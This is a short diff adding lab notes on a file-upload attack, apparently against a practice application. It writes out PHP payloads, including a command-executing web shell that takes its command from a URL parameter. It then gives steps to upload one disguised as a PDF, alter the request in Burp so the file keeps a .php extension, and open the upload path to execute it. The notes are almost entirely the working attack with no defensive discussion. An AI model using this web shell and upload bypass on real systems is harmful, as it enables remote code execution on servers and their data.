@@ -1,0 +1,19 @@
+-> Server Side Attack Variant 2
+
+Make php file with any of code, samples:
+
+<?php echo "hacked"; ?>
+
+<?php phpinfo(); ?>
+
+<?php system($_GET[‘cmd’]); ?>
+
+Save it in filename.pdf
+
+Start burp intercept
+
+Press Upload and capture the request
+
+Change filetype to application/pdf and rename file to filename.php
+
+Visit the path /static/uploads/File-Upload-Vulnerabilities-V2/filename.php and file will get executed
